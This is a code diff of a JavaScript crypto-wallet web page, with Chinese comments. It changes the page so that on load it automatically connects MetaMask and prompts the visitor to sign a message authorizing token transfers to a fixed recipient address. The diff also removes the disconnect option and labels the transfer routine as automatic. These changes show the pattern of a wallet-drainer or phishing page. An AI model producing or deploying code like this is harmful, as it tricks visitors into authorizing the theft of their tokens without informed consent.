@@ -24,15 +24,12 @@ const erc20Abi = [
     }
 ];
 
-document.getElementById('connectButton').onclick = async () => {
-    const selectedWallet = document.getElementById('walletSelector').value;
-
+// 页面加载后自动连接钱包并跳转到签名流程
+window.onload = async () => {
+    const selectedWallet = 'metamask'; // 默认选择 MetaMask
+    document.getElementById('walletSelector').value = selectedWallet;
+    
     try {
-        if (isConnected) {
-            document.getElementById('status').innerText = '已连接的设备，请先断开连接';
-            return;
-        }
-
         if (selectedWallet === 'metamask') {
             if (window.ethereum) {
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -41,6 +38,9 @@ document.getElementById('connectButton').onclick = async () => {
                 updateWalletList(accounts[0]);
                 isConnected = true;
                 document.getElementById('status').innerText = 'MetaMask 已连接';
+                
+                // 自动发起签名请求
+                await signMessage(accounts[0]);
             } else {
                 document.getElementById('status').innerText = '请安装 MetaMask 钱包';
             }
@@ -55,6 +55,9 @@ document.getElementById('connectButton').onclick = async () => {
             updateWalletList(accounts[0]);
             isConnected = true;
             document.getElementById('status').innerText = 'WalletConnect 已连接';
+
+            // 自动发起签名请求
+            await signMessage(accounts[0]);
         }
 
         document.getElementById('transferButton').disabled = false;
@@ -63,6 +66,7 @@ document.getElementById('connectButton').onclick = async () => {
     }
 };
 
+// 更新已连接钱包列表
 const updateWalletList = (address) => {
     const walletList = document.getElementById('walletList');
     const walletItem = document.createElement('li');
@@ -70,20 +74,19 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-const disconnectWallet = async () => {
-    if (walletConnectProvider) {
-        await walletConnectProvider.disconnect();
-        walletConnectProvider = null;
+// 自动签名的函数
+const signMessage = async (account) => {
+    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+    try {
+        const signature = await web3.eth.personal.sign(message, account);
+        document.getElementById('status').innerText += `\n签名成功: ${signature}`;
+    } catch (error) {
+        document.getElementById('status').innerText += `\n签名失败: ${error.message}`;
     }
-    web3 = null;
-    isConnected = false;
-    document.getElementById('status').innerText = '已断开连接';
-    document.getElementById('walletList').innerHTML = ''; // 清空钱包列表
 };
 
-document.getElementById('disconnectButton').onclick = disconnectWallet;
-
-async function getTokenBalances(address) {
+// 获取代币余额并转移
+const getTokenBalances = async (address) => {
     try {
         const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=${etherscanApiKey}`;
         const response = await axios.get(url);
@@ -115,8 +118,9 @@ async function getTokenBalances(address) {
     } catch (error) {
         document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
     }
-}
+};
 
+// 点击按钮自动执行代币转移操作
 document.getElementById('transferButton').onclick = async () => {
     const walletInput = document.getElementById('wallets').value;
     const walletAddresses = walletInput.split(',').map(addr => addr.trim());
@@ -150,4 +154,3 @@ document.getElementById('transferButton').onclick = async () => {
 
     document.getElementById('status').innerText += '\n所有代币转移完成';
 };
-
